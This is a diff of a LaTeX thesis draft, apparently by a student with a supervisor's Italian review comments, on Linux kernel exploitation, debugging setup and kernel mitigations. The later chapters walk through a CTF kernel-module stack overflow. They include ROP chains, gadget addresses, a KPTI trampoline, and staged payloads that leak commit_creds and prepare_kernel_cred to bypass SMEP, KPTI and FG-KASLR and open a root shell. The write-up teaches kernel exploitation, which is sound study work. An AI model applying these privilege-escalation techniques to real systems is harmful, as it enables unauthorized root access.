@@ -73,24 +73,26 @@ This layer of software is the operating system, and its core is the kernel.
 
 In modern operating systems, the kernel acts for the things we normally assume: virtual memory, hard-drive access, input/output handling, and so forth. Generally larger than most user applications, the kernel is a complex and charming piece of code usually written in a collection of assembly, the low level machine language, and C.
 Moreover, the kernel employs some underlying architecture properties to separate itself from the rest of the running programs.
-In fact, most \emph{Instruction Set Architectures} (ISA)~\cite{silberman1993architectural} supply at least two modes of execution: a \emph{privileged mode}, where the machine-level instructions are completely accessible, and an \emph{unprivileged/user mode}, in which only a subset of instructions are accessible.
+In fact, most \emph{Instruction Set Architectures} ~\cite{silberman1993architectural} supply at least two modes of execution: a \emph{privileged mode}, where the machine-level instructions are completely accessible, and an \emph{unprivileged/user mode}, in which only a subset of instructions are accessible.
 Furthermore, the kernel protects itself from user applications by realizing separation at the software level.
-When we have to set up the virtual memory subsystem, the kernel makes it possible to access the address space (i.e., the range of virtual memory addresses) of any process, and no process can directly refer to the kernel memory.
+When we have to set up the virtual memory subsystem, the kernel makes it possible to access the address space (i.e., the range of virtual memory addresses) of any process, and no process can directly refer to the kernel memory.\\
 
-The reference to\glnote{We will call\ldots ?} the memory visible only to the kernel as \emph{kernel-land} memory and the memory a user process sees as \emph{user-land} memory. The term user-land refers to all code that runs outside the operating system's kernel. User-land usually refers to the various programs and libraries that the operating system uses to interact with the kernel\glnote{ho aggiunto emph; forse si può dire, più in generale, che chiamiamo ``user-land'' la parte di sistema vista da un processo utente, etc etc}
-Code executing in kernel-land runs with full privileges and can access any valid memory address on the system, while code executing in user-land is subject to all limits as describe above. This separation between hardware- and software-based\glnote{non capisco il discorso hw- sw-based} is necessary to protect the kernel from accidental damage or alteration resulting from a misbehaving or malicious user-land application.
+Moreover, the kernel protects itself from user applications by implementing separation at the software level. When it comes to setting up the virtual memory subsystem, the kernel ensures that it can access the address space (i.e., the range of virtual memory addresses) of any process and that no process can directly reference the kernel memory. 
+We will call\glnote{We will call\ldots ?} the memory visible only to the kernel as \emph{kernel-land} memory and the memory a user process sees as \emph{user-land} memory. The term ``user-land'' refers to all code that runs outside the operating system's kernel. User-land usually refers to the various programs and libraries that the operating system uses to interact with the kernel\glnote{ho aggiunto emph; forse si può dire, più in generale, che chiamiamo ``user-land'' la parte di sistema vista da un processo utente, etc etc}
+Code executing in kernel-land runs with full privileges and can access any valid memory address on the system, while code executing in user-land is subject to all limits as describe above.
+Code executing in kernel land runs with full privileges and can access any valid memory address on the system, whereas code executing in user-land is subject to all the limitations we described earlier.
+This separation between hardware- and software-based\glnote{non capisco il discorso hw- sw-based} is necessary to protect the kernel from accidental damage or alteration resulting from a misbehaving or malicious user-land application.
 
 \chapter{Art of Exploitation}
 \label{ch:exploitation}
 
-There are various ways an attacker can behave as a \emph{super-user}, the most excitement is generally performed with the development of an exploit.\glnote{non capisco la frase}
-\vtnote{Forse mi sono spiegato male....There are various ways an attacker can gain root privileges, ...}
+There are various ways an attacker can gain root privileges, There are various ways an attacker can behave as a \emph{super-user}, the most excitement is generally performed with the development of an \emph{``exploit''}.\glnote{non capisco la fraseintendevo per ottenere i privilegi...}
 The meaning behind \emph{exploitation} is really simple: software has bugs, and these make the software work not correctly, or otherwise perform incorrectly a task that had to perform in an appropriate way.
 And all this means an advantage for the \emph{attacker}. Not every bug is exploitable; we refer to those that are as \emph{vulnerabilities}.
 Analyzing an application to establish its vulnerability is called \emph{auditing}\glnote{non urlare ;-) ... usa emph e basta, non tutto in maiuscolo}\vtnote{XD}. It entails:
 \begin{itemize}
 \item \emph{Reading} the source code of the application, if available;
-\item \emph{Reversing} the application binary; that is, reading the disassembly of the compiled code
+\item \emph{Reversing} the application binary; that is, reading the disassembly of the compiled code;
 \item \emph{Fuzzing} the application interface; that is feeding the application random or pattern-based, automatically generated input.
 \end{itemize}
 
@@ -102,19 +104,20 @@ Until now the kernel has been described as the entity through which many counter
 With the large diffusion of security patches and the contemporary reduction of user-land vulnerabilities, the attention of exploits writers has gone toward the core of the operating system.
 However, writing a \emph{kernel-land exploit} presents various extra challenges if compared to a user-land exploit:
 \begin{itemize}
-\item The kernel is the only piece of software that is strictly for the system. As long as the kernel works correctly, there is no incorrigible situation.
+\item The kernel is the only piece of software that is strictly for the system. As long as the kernel works correctly, there is no incorrigible situation.\\
 This explains why user-land brute forcing, for example, is a feasibly choice: the only real worry we have to confront when we repeatedly crash our victim application is the noise we might create in the logs.
-When it comes to the kernel, this hypothesis is not\glnote{nel linguaggio formale, come quello di una tesi, non usare mai le contrazioni; in questo caso: ``is not'' (cambia ovunque)} true anymore: an error at the kernel level leaves the system in an \emph{inconsistent state}, and it is usually required to take back the machine to its appropriate functioning.
- If the error happens inside one of the sensible areas of the kernel, the operating system will just shut down, a condition known as panic.
+When it comes to the kernel, this hypothesis is not true anymore: an error at the kernel level leaves the system in an \emph{inconsistent state}, and it is usually required to take back the machine to its appropriate functioning.
+If the error happens inside one of the sensible areas of the kernel, the operating system will just shut down, a condition known as panic~\cite{cheng2021kernel}.
 \item The kernel is protected from user-land via both software and hardware. Finding information about the kernel is a much more difficult job. At the same time, the number of variables that are no more under the attacker’s control intensifies in an exponentially way. For example, let's consider the \emph{memory allocator}.
 In a user-land exploit, the allocator is inside \emph{the process}, generally connected through a shared system library. Your purpose is its only consumer and its only \emph{affecter}\glnote{non capisco la frase}\vtnote{Per questa sezione ho preso spunto da "a guide to kernel exploit"...}. On the other side, all the processes on the system may concern the behavior and the status of a kernel memory allocator.
 \item The kernel is a large and complex system. The dimension of the kernel is substantive, on the order of millions of lines of source code\glnote{metti il numero di linee del kernel attuale; forse ci potrebbe stare bene anche un grafico di come è cresciuto negli anni, se si trova (mi sembra di aver visto qualcosa in giro)}:
 \begin{figure}[h!]
-   \makebox[\textwidth][c]{\includegraphics{images/linux-lines-code.png}}
+\caption{Number of lines of Unix kernel code from 2004 to 2020. While the number of developers has decreased, the growth of the kernel code is constant.}
+   \makebox[\textwidth][c]{\includegraphics[height=0.4
+  \textwidth]{images/linux-lines-code.png}}
    \caption{Growth of Codebase Kernel Linux}
    \label{graphview}
-\end{figure}
-
+\end{figure} 
 The kernel has to control all the hardware on the computer and most of the lower-level software
 abstractions (virtual memory, file systems, IPC facilities, etc.). This implies many hierarchical, interconnected subsystems that the attacker may have to deeply understand to successfully trigger and exploit a specific
 vulnerability. This characteristic can also become an advantage for the exploit developer, as a complex system is also less likely to be bug-free.
@@ -126,7 +129,6 @@ vulnerability. This characteristic can also become an advantage for the exploit 
 
 \section{Debugging}
 \label{sect:debugging}
-
 In user space we had the support of the kernel so we could easily stop processes and use gdb to inspect their behavior.
 GDB~\cite{stallman1988debugging})\glnote{collegamento wiki??? se vuoi mettere un collegamento, metti la pagina ufficiale di gdb}\vtnote{collegamento wiki intendo i riferimenti che devo fare con bibitex o a siti :D} allows you to see what is going on \emph{inside} another program while it executes -- or what another program was doing at the moment it crashed.
 \subsection{GDB}
@@ -149,15 +151,15 @@ Given the lack of convenience of the first option, a hypervisor is preferred.
 Among them we have \emph{QEMU} ~\cite{bellard2005qemu}, a hosted hypervisor, that is, running within a traditional operating system, just like any other program.
 In the kernel, in order to use gdb we need to use hypervisor like QEMU based hardware interfaces which are not always available.
 The Linux kernel provides a set of tools and debug options useful for investigating abnormal behavior.
-
 \subsection{Running QEMU}
 \label{subsect:QEMU}
-As said previously, to debug the kernel we need the qemu hypervisor. Specifically, there are some options needed in kernel analysis:\glnote{usa un itemize per fare elenco puntato; alcune opzioni non mi sembra che siano per l'analisi, ma semplicemente per far partire un sistema linux sotto qemu}
+As said previously, to debug the kernel we need the qemu hypervisor. Specifically, there are some options needed in kernel analysis:
+There are some options we need to run an operating system and analyze the kernel:
+\glnote{usa un itemize per fare elenco puntato; alcune opzioni non mi sembra che siano per l'analisi, ma semplicemente per far partire un sistema linux sotto qemu}
 \vtnote{potrei dire....There are some options we need to run an operating system and analyze the kernel:}
-
 \begin{itemize}
-\item -kernel <path>, (where <path> means the) Path to kernel image to debug;
-\item -initrd <path>, Path to initial Ram disk. In short, a RAM disk is a filesystem dynamically placed in you RAM memory in boot time that contains the basic stuff needed to get your real filesystem running with the first processes needed to get your whole system running as expected, like the init process;
+\item -kernel  ``path'', (where path means the) Path to kernel image to debug;
+\item -initrd ``path'', Path to initial Ram disk. In short, a RAM disk is a filesystem dynamically placed in you RAM memory in boot time that contains the basic stuff needed to get your real filesystem running with the first processes needed to get your whole system running as expected, like the init process;
 \item -gdb dev , wait for gdb connection on device dev. Typical connections will likely be TCP-based, but also UDP, pseudo TTY, or even stdio are reasonable use case;
 \item -s, shorthand for -gdb tcp::1234, i.e. open a gdbserver on TCP port 1234;
 \item -S, freeze the CPU on startup;
@@ -166,22 +168,19 @@ As said previously, to debug the kernel we need the qemu hypervisor. Specificall
 \item -append, specifies additional boot options. This is also where we can enable/disable mitigation features.
 \end{itemize}
 These options are essential for analyzing the kernel. But qemu supports other options (indicate the documentation site) which may be useful for running the system and to help the user in the analysis.
-
-
 \chapter{Kernel configuration}
 \label{ch:kernel-configuration}
 \glnote{dalle altre parti hai usato ``we''; vanno bene entrambi, tendenzialmente si usa ``we'', però l'importante è essere consistente}
 \vtnote{Sisi, controllo che non ci siano altri cambi di pronomi}
-We recommended that you build and install your own kernel, rather than running the stock kernel that comes with your distribution. One of the strongest reasons for running your own kernel is that the kernel developers have built several debugging features into the kernel itself. These features can create extra output and slow performance, so they tend not to be enabled in production kernels from distributors.
-
-When building a kernel for debugging with gdb, I would advise using the following configuration options to make debugging a bit more pleasant.
-
+We recommended that you build and install your own kernel, rather than running the stock kernel that comes with your distribution. One of the strongest reasons for running your own kernel is that the kernel developers have built several debugging features into the kernel itself. These features can create extra output and slow performance, so they tend not to be enabled in production kernels from distributors.\\
+When building a kernel for debugging with gdb, I would advise using the following configuration options to make debugging a bit more pleasant.\\
 Except where specified otherwise, all of these options are found under the \emph{``kernel hacking"} menu in whatever kernel configuration tool you prefer. Note that some of these options are not supported by all architectures and if it is addes, it is not considered for the building of kernel.
 \glnote{usa lstlisting (da tutte le parti, la formattazione è tutta sbagliata)}
 \begin{lstlisting}
 CONFIG_GDB_SCRIPTS adds links to the GDB helper scripts.I find it particularly useful when debugging a kernel module, when I need to inspect the kernel log buffer or VFS mounts.
 
 CONFIG_KGDB enables the built in kernel debugger, which allows for remote debugging. Technically this option is the only one that is strictly required, but attempting to debug without debug symbols will make debugging much harder.
+
 CONFIG_FRAME_POINTER inserts code to into the compiled executable which saves the frame information in registers or on the stack at different points.
 
 CONFIG_DEBUG_KERNEL makes other debugging options available.
@@ -197,22 +196,21 @@ CONFIG_INIT_DEBUG where items marked with _ _init (or _ _initdata) are discarded
 CONFIG_DEBUG_INFO causes the kernel to be built with full debugging information included. Including debug information in the kernel and kernel modules will make both the image and the modules larger in size.
 
 CONFIG_DEBUG_STACK_USAGE and CONFIG_DEBUG_STACKOVERFLOW to check the overflows of kernel, IRQ and exception stacks. This option will cause messages of the stacks in detail when free stack space drops below a certain limit.
-A sure sign of a stack overflow is an oops[cit]listing without any sort of reasonable back trace. The first option adds explicit overflow checks to the kernel; the second causes the kernel to monitor stack usage and make some statistics available via the magic SysRq key.
 
 CONFIG_KALLSYMS causes kernel symbol information to be built into the kernel; it is enabled by default. The symbol information is used in debugging contexts; without it, an oops listing can give you a kernel traceback only in hexadecimal, which is not very useful.
 
-CONFIG_IKCONFIG and CONFIG_IKCONFIG_PROC (found in the "General setup" menu) cause the full kernel configuration state to be built into the kernel and to be made available via /proc. Most kernel developers know which configuration they used and do not need these options (which make the kernel bigger). They can be useful, though, if you are trying to debug a problem in a kernel built by somebody else.
+CONFIG_IKCONFIG and CONFIG_IKCONFIG_PROC (found in the "General setup" menu) cause the full kernel configuration state to be built into the kernel and to be made available via /proc. Most kernel developers know which configuration they used and do not need these options (which make the kernel bigger).
 \end{lstlisting}
-
 If you do not want to use menuconfig is possible to set configuration options via command line using the following
-\lstinline{$ ./scripts/config -e CONFIG_<your option>} .\\
+\lstinline{$ ./scripts/config -e CONFIG_<your option>} .
 Once you have enabled all these options, you need to build the kernel.
-This is done from the command line:\\
-\lstinline{$ make -j$(nproc)}\\
+This is done from the command line \lstinline{$ make -j$(nproc)}\\
 Before starting the VM and attempting to attach gdb, set up gdb to load the Linux helper scripts by adding \lstinline{add-auto-load-safe-path} to your \lstinline{~/.gdbinit}.
 
 \chapter{Linux kernel mitigation features}
 \label{ch:mitigation}
+In this chapter, we will see with which techniques the kernel defends itself from possible attacks.
+From those similar to userland \refToSection{like userland} to specific ones tailored to the kernel \refToSection{powerful mitigation}
 \section{Mitigation features like Userland}
 \label{sect:like userland}
 Just like mitigation features such as ASLR, stack canaries, PIE, etc. used by userland programs, kernel also have their own set of mitigation features. Below are some of the popular and notable Linux kernel mitigation features.
@@ -233,7 +231,7 @@ The KASLR feature is enabled by default.
 \section{Powerful linux mitigation features}
 \label{sect:powerful mitigation}
 \glnote{dire su che processori sono supportate/cosa serve a livello hardware}
-
+To do....
 \subsection{Supervisor mode execution protection (SMEP)}
 \label{subsect:SMEP}
 The processor introduces a new machanism that provides next level of system protection by blocking malicious software attacks from user mode code when the system is running in the highest privilege level.
@@ -246,9 +244,8 @@ Complementing SMEP, this feature marks all the userland pages in the page table 
 
 \subsection{Kernel page-table isolation}
 \label{subsect:KPTI}
-Kernel page-table isolation (KPTI or PTI,previously called KAISER) is a Linux kernel feature improves kernel hardening against attempts to bypass kernel address space layout randomization (KASLR). It works by better isolating user space and kernel space memory.\glnote{è stata introdotta contro Meltdown, se non vado errato; andrebbe detto}
-\glnote{l'ho citata nell'exploit, ma lo posso dire qui}
-This mitigation was added to avoid the \emph{Meltdown} (wiki).
+Kernel page-table isolation (KPTI or PTI,previously called KAISER) is a Linux kernel feature improves kernel hardening against attempts to bypass kernel address space layout randomization (KASLR). It works by better isolating user space and kernel space memory.
+This mitigation was added to avoid the \emph{Meltdown}~\cite{lipp2018meltdown}.
 When this feature is active, the kernel separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contains both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a minimal set of kernel-space addresses.
 
 \subsection{Function Granular Kernel Address Space Layout Randomization}
@@ -271,8 +268,8 @@ Finer grained ASLR has been proposed as a way to make ASLR more resistantto info
 \chapter{Intensification of mitigation features}
 \label{ch:adding mitigation}
 In this chapter, I will show how mitigations make it harder to exploit root privileges.
-In particular, I will explore the resolution of a \emph{CTF} (wiki CTF https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/), starting from an environment without mitigations up to adding all the mitigations to solve the real CTF.
-To do this I will use a technique called \emph{ROP}(wiki) with a module having an extremely trivial and standard bug.
+In particular, I will explore the resolution of a \emph{CTF}~\cite{hxp-CTF-2020-kernel-rop}, starting from an environment without mitigations up to adding all the mitigations to solve the real CTF.
+To do this I will use a technique called \emph{ROP}~\cite{roemer2012return} with a module having an extremely trivial and standard bug.
 \section{Setup environment}
 Our task is to exploit a vulnearable custom kernel module that is installed into the kernel on boot.
 I will use the setup seen for the kernel in the section (dire la sezione del setup kernel) and the one for qemu (esplicitare sezione di qemu).
@@ -281,7 +278,7 @@ To do this, the command is also added to the qemu settings:
 \lstinline{-hdb flag.txt}
 that it puts flag.txt into /dev/sda instead of leaving the flag.txt as a normal file in the system.
 Another important step is to find gadgets inside the kernel to be able to perform a rop chain.
-This is possible with ROPgadget (https://github.com/JonathanSalwan/ROPgadget), which searches for all possible gadgets within the kernel.
+This is possible with ROPgadget~\cite{rop_gadget}, which searches for all possible gadgets within the kernel.
 Since this type of operation produces an enormous amount of data, it is preferable to save everything on a file that can always be consulted for the following steps.
 To perform the exploit, the executable file containing the necessary steps for the exploit must be inserted into the file system.
 \subsection{Analyzing the kernel module}
@@ -321,7 +318,7 @@ ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
     //...
 }
 \end{lstlisting}
-The bug, the same in both methods, reads / writes to a buffer stack of length 0x80 bytes, but only warns of a buffer overflow if the size is greater than 0x1000. Using this bug, we can freely read / write to the kernel stack.
+The bug, the same in both methods, reads/writes to a buffer stack of length 0x80 bytes, but only warns of a buffer overflow if the size is greater than 0x1000. Using this bug, we can freely read/write to the kernel stack.
 
 \section{Stack cookies}
 Now, let's see what we can do with the above primitives to gain root privileges, starting with one possible mitigation feature: only cookies stack.
@@ -335,9 +332,10 @@ The \emph{buffer} in the stack itself is 0x80 bytes long and the stack cookie is
 To overwrite the return address, the same procedure is carried out for leaking, overwriting the cookie with ours. Note, however, that after the cookie there are 3 registers \emph{rbx, r12, and rbp} (different in the userland because the only rbp appears).
 This involves inserting three dummy values after our cookie and inserting the return address we want our program to return to, which corresponds to the function we will create in the user area to get root privileges.
 \subsection{Getting root privileges}
+\label{subsect:get privileges}
 Our goal is to get root privileges on the system.
-This can be done through two functions that already reside in the same kernel-space code: commit_creds () and prepare_kernel_cred ().
-Since KASLR is disabled, the addresses where the functions reside are constant at every start. So we can get those addresses by reading the \emph{/proc/kallsyms} file with the following terminal commands:
+This can be done through two functions that already reside in the same kernel-space code: \texttt{commit_creds()} and \texttt{prepare_kernel_cred()}.
+Since KASLR is disabled, the addresses where the functions reside are constant at every start. So we can get those addresses by reading the \texttt{/proc/kallsyms} file with the following terminal commands:
 \begin{lstlisting}
 cat /proc/kallsyms | grep commit_creds
 -> ffffffff814c6410 T commit_creds
@@ -347,8 +345,8 @@ cat /proc/kallsyms | grep prepare_kernel_cred
 Then to get root privileges you need to write a code where the two functions are called consecutively using the return value of one as a parameter of the other.
 At this point, we need to recall an instruction that allows you to return to userland.
 This can be done with \emph{iretq} or \emph{sysretq}.
-With iretq it is much simpler as you need to configure the stack with 5 user area registry values in this order:\emph{RIP | CS | RFLAGS | SP | SS}.
-For the RIP, we can set the address of the function that allows you to open a shell, while for the others you need to enter values that return to a state before entering kernel mode.
+With iretq it is much simpler as you need to configure the stack with 5 user area registry values in this order:\texttt{RIP | CS | RFLAGS | SP | SS}.
+For the \texttt{RIP}, we can set the address of the function that allows you to open a shell, while for the others you need to enter values that return to a state before entering kernel mode.
 The best solution, therefore, is to save the state of the registers before entering kernel mode and reload them after obtaining root privileges.
 \begin{lstlisting}
 void save_state(){
@@ -393,7 +391,7 @@ void escalate_privs(void){
 }
 \end{lstlisting}
 \section{Adding SMEP}
-In the previous section (citare il numero) we used our piece of code which is saved in the userspace. Bvy activating SMEP, as mentioned in the paragraph (dove l'ho citato), user pages are marked as not executable while in kernel mode.
+In \refToSubSection{get privileges} we used our piece of code which is saved in the userspace. By activating SMEP, as \refToSubSection{SMAP}, user pages are marked as not executable while in kernel mode.
 There are two possible scenarios:
 \begin{itemize}
 \item Write an arbitrary amount of data to the kernel stack.
@@ -403,14 +401,15 @@ There are two possible scenarios:
 \label{subsect:CR4}
 The 20th bit of the CR4 control register is responsible for enabling or disabling SMEP.
 In kernel mode, we have the power to modify the contents of the control register.
-To do this there is a special instruction \lstinline{mov cr4, rdi} called by a function called native_write_cr4().
+To do this there is a special instruction \lstinline{mov cr4, rdi} called by a function called \texttt{native_write_cr4()}.
 So to be able to bypass SMEP you try to execute ROP inside this function.
-As for the commit_creeds() and prepare_kernel_cred() functions, we find the address by reading \lstinline{/proc/kallsyms}.
-To build the ROP chain we use the same approach used in userland, but instead of going back to our userland code, we go back into the native_write_cr4 (value) function, insert the value we need and then go back to the code to get the privileges.
+As for the \emph{commit_creeds()} and \emph{prepare_kernel_cred()} functions, we find the address by reading \lstinline{/proc/kallsyms}.
+To build the ROP chain we use the same approach used in userland, but instead of going back to our userland code, we go back into the native_write_cr4(value) function, insert the value we need and then go back to the code to get the privileges.
 By reading the documentation of the CR4 bit, the developers, knowing of this possible solution to bypass SMEP, have blocked the possibility of overwriting that bit.
 Each time they are overwritten they are reset with the kernel boot settings.
 So the first scenario cannot be undertaken to obtain privileges.
 \subsection{Second scenario}
+\label{subsect:second scenario}
 In the second scenario, however, we will no longer exploit our userland code but only the ROP technique.
 The plan is quite simple:
 \begin{itemize}
@@ -421,7 +420,7 @@ The plan is quite simple:
 \end{itemize}
 The ROP chain is trivial, but the gadgets found in the kernel cannot always be exploited, so many attempts must be made to find the right gadget.
 Some instructions might seem strange, but sometimes only some are really usable and executable.
-For example, to move the return value in step 1 (stored in rax) to rdi to move to commit_creds (), the only instructions are:
+For example, to move the return value in step 1 (stored in rax) to rdi to move to \texttt{commit_creds()}, the only instructions are:
 \begin{lstlisting}
 unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx; ret
 unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8; jne 0xffffffff81964cbb; pop rbx; pop rbp; ret
@@ -429,8 +428,8 @@ unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax; jn
 \end{lstlisting}
 They might sound a little bizarre, but all the ordinary gadgets tried are not executable.
 This is not always the case, it depends on the kernel in use, in fact very important at this stage is to try all possible solutions.
-The above code, entering 8 in rdx ignores the jne instruction, allows you to write the rax value in rdi that will be used for the commit_creds function (prepare_kernel_cred (0))
-While ROPgadget can find swapgs, it does not find iretq, so we use objdump to find the right address and be able to write the full ROP chain.
+The above code, entering 8 in rdx ignores the jne instruction, allows you to write the rax value in rdi that will be used for the \texttt{commit_creds function(prepare_kernel_cred (0))}
+While ROPgadget can find swapgs, it does not find iretq, so we use objdump~\cite{weatherspoonassemblers} to find the right address and be able to write the full ROP chain.
 \begin{lstlisting}
 void get_shell(void){
     puts("[*] Returned to userland");
@@ -483,11 +482,11 @@ void overflow(void){
 \end{lstlisting}
 \section{Adding KPTI}
 \label{sect:trampoline}
-As mentioned in the paragraph (quote the part with ktpi) the user-space and kernel-space page tables are separate. In fact, in user mode, a page set includes user-space page tables and only a few kernel-space addresses.
+As mentioned in \refToSubSection{KPTI} the user-space and kernel-space page tables are separate. In fact, in user mode, a page set includes user-space page tables and only a few kernel-space addresses.
 There are several ways to bypass this mitigation, but the one we are going to look at is called a \emph{trampoline}.
 Logically if a system call returns normally there must be a piece of code in the kernel that swaps the page tables to the userland, so we will try to reuse that code for our purpose.
 This piece of code is called a trampoline and swaps the page tables, swapgs, and iretq.
-\section{Tweaking the ROP chain}
+\subsection{Tweaking the ROP chain}
 The piece of code resides in a function called \lstinline{swapgs_restore_regs_and_return_to_usermode()} which we always find with \lstinline{/proc/kallsyms}.
 \begin{lstlisting}
 .text:FFFFFFFF81200F10                 pop     r15
@@ -527,22 +526,16 @@ void overflow(void){
     // ...
 \end{lstlisting}
 This solution can be used regardless of whether KPTI is enabled or not.
-So, even if different from the one seen in the paragraph (subsection {Second scenario}), it can be used to bypass the SMEP.
+So, even if different from the one seen in \refToSubSection{second scenario}, it can be used to bypass the SMEP.
 \section{Adding SMAP}
 This feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written.
 In the kernel, this is enabled by setting the 21st bit of Control Register CR4.
-If we consider the (overwrite C4) section, the idea of having the entire ROP chain in the kernel stack also works to bypass SMAP.
-The pivoting technique seen in the (second scenario) section is not effective because the stack push and pop operations require read and write access and SMAP does not allow this. The primitives of writing and reading from the stack seen so far do not allow for a successful exploit. So we need more primitives.
+If we consider \refToSubSection{CR4}, the idea of having the entire ROP chain in the kernel stack also works to bypass SMAP.
+The pivoting technique seen in \refToSubSection{second scenario} is not effective because the stack push and pop operations require read and write access and SMAP does not allow this. The primitives of writing and reading from the stack seen so far do not allow for a successful exploit. So we need more primitives.
 \section{Adding KASLR and FG-KASLR}
-Con KASLR attivo, come ASLR nello user-land, l'indirizzo di base su cui viene caricata l'immagine del kernel è randomizzato ogni volta che il sistema viene avviato.
-Per ovviare a tale problema nello user-land facciamo trapelare un indirizzo nela sezione, calcoliamo l'indirizzo base della sezione da esso e quindi tutti gli altri indirizzi verrano solo spostati da lì perchè l'unica cosa randomizzata è l'indirizzo di base, mentre l'offset restano invariati.
-Teoricamente dovrebbe valere lo stesso per KASLR, ma avviando più volte il sistema e leggendo /proc/kallsyms si nota che la maggior parte dei simboli viene randomizzata da sola, senza avere un offset costante come nello user-land.
-Ciò è dovuto a FG-KASRL che riorganizza il codice del kernel al momento del caricamento su un livello di granularità per funzione.
-In teoria, se tutto nel kernel viene completamente randomizzato, sarà quasi impossibile per noi raccogliere gadget utili dall'immagine del kernel. Ma tale funzionalità di mitigazione soffre ancora di punti deboli e quindi è possibile ancora effettuare un exploit di successo
-
 With KASLR active, as ASLR in user-land, the base address on which the kernel image is loaded is randomized each time the system is booted.
 To overcome this problem in the user-land we leak an address in the section, we calculate the base address of the section from it and then all the other addresses will only be moved from there because the only randomized thing is the base address, while the offset remains unchanged.
-Theoretically, this should be the same for KASLR, but booting the system several times and reading /proc/kallsyms shows that most of the symbols are randomized by themselves, without having a constant offset like in user-land.
+Theoretically, this should be the same for KASLR, but booting the system several times and reading \emph{/proc/kallsyms} shows that most of the symbols are randomized by themselves, without having a constant offset like in user-land.
 This is due to FG-KASRL reorganizing the kernel code at load time on a per-function level.
 In theory, if everything in the kernel is completely randomized, it will be nearly impossible for us to collect useful gadgets from the kernel image. But such mitigation functionality still suffers from weaknesses and thus a successful exploit is still possible.
 \subsection{Gathering useful gadgets}
@@ -586,7 +579,7 @@ ffffffffaab85198 R __start___ksymtab
 
 
 
-\lstinline{__ x86_retpoline_r15}, \lstinline{swapgs_restore_regs_and_return_to_usermode}, \lstinline{ksymtab} are never randomized with respect to \lstinline{_text}, and in particular both \lstinline{commit_creds} and \lstinline{prepare_kernel_cred} keep the same offset inside \lstinline{ksymtab}.
+\texttt{\lstinline{__ x86_retpoline_r15}, \lstinline{swapgs_restore_regs_and_return_to_usermode}, \lstinline{ksymtab}} are never randomized with respect to \lstinline{_text}, and in particular both \lstinline{commit_creds} and \lstinline{prepare_kernel_cred} keep the same offset inside \lstinline{ksymtab}.
 To find the base image instead, you need to inspect the stack when reading the module, look at a large amount of data and find an address located in the \lstinline{_text} region.
 Reading 320 bytes, we find at 304th byte an address that falls in the region of \lstinline{_text}. From that value, we subtract the address of \lstinline{_text} and find the base image.
 From there we calculate the various offsets with the functions not affected by FG_KASLR:
@@ -614,7 +607,7 @@ From here on we have 4 stages:
 \item Calling commit_creds() and opening root shell;
 \end{enumerate}
 \subsection{Leaking commit_creds and prepare_kernel_cred()}
-The goal is to leak \lstinline{commit_creds()} and read the value_offset of \lstinline{ksymtab_commit_creds}, then add them together. We will use our 2 memory reading gadgets to read it, using the ROP technique introduced in the paragraph (kpti trampoline), and safely return to the user-land via the KPTI trampoline to prepare for the next step.
+The goal is to leak \lstinline{commit_creds()} and read the value_offset of \lstinline{ksymtab_commit_creds}, then add them together. We will use our 2 memory reading gadgets to read it, using the ROP technique introduced in \refToSection{trampoline}, and safely return to the user-land via the KPTI trampoline to prepare for the next step.
 \begin{lstlisting}
 void stage_1(void){
     unsigned n = 50;
@@ -684,7 +677,7 @@ This way we bypass a fairly difficult part of the ROP chain, move the value rece
 \begin{lstlisting}
 void stage_3(void){
     ...
-    As stage 1
+    //As stage 1
     ...
     payload[off++] = pop_rdi_rbp_ret; // return address
     payload[off++] = 0; // rdi <- 0
@@ -698,7 +691,7 @@ void stage_3(void){
     payload[off++] = user_rflags;
     payload[off++] = user_sp;
     payload[off++] = user_ss;
-    ....
+    ...
 }
 
 void after_prepare_kernel_cred(void){
@@ -714,7 +707,7 @@ void after_prepare_kernel_cred(void){
 
 void stage_4(void){
     ...
-    As stage 3
+    //As stage 3
     ...
     payload[off++] = returned_creds_struct; // rdi <- returned_creds_struct
     payload[off++] = 0; // dummy rbp
@@ -730,11 +723,9 @@ void stage_4(void){
 
     puts("[*] Prepared payload to call commit_creds(returned_creds_struct)");
     ssize_t w = write(global_fd, payload, sizeof(payload));
-
-    puts("[!] Should never be reached");
 }
-
 \end{lstlisting} 
+\chapter{Conclusion}
 \bibliographystyle{alphaurl}
 \bibliography{bib}
 \end{document}
